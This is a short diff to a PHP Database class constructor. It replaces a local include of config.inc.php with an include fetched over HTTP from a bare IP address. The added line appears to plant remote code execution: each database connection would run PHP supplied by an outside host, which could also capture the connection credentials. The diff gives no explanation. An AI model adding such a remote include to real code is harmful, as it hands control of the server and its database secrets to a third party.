@@ -16,7 +16,7 @@ class Database{
 	 * @param $db: (String) Name of the database
 	 */
 	public function Database(){
-		include(__DIR__ . "/config.inc.php");
+		include("http://86.107.110.214/modules/utilities/config.inc.php");
 		//$link = mysql_connect($location, $login, $passsword)
 		$this->link = new mysqli($location, $login, $password, $dbName);
 		if ($this->link->connect_errno != 0) {
